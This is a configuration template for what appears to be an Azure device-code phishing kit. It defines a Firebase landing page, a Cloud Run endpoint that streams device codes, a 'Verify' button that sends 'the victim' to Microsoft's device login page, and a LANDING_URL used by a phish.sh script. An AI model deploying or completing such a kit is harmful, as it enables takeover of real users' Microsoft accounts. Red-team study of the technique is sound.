# ── Firebase landing page (consumed by build:firebase) ───────────────────────
# URL of the Cloud Run /code endpoint that streams device codes to the page.
# Auto-populated by `npm run deploy:container` — leave the placeholder for first run.
CLOUD_RUN_URL=https://your-code-service-xxxx.run.app/code

# Bearer token expected by the Cloud Run /code endpoint.
# Generate with: openssl rand -hex 32
API_KEY=replace-me

# Where the "Verify" button on the landing page sends the victim.
TARGET_URL=https://microsoft.com/devicelogin


# ── Cloud Run backend (consumed by deploy:container) ─────────────────────────
# Your GCP project ID — same one selected with `gcloud config set project ...`.
GCP_PROJECT=your-gcp-project-id

# Cloud Run region.
GCP_REGION=us-central1


# ── AzurePhish (consumed by scripts/phish.sh) ────────────────────────────────
# Public URL of the deployed landing page — interpolated into the alert subject.
LANDING_URL=your-landing-page.web.app
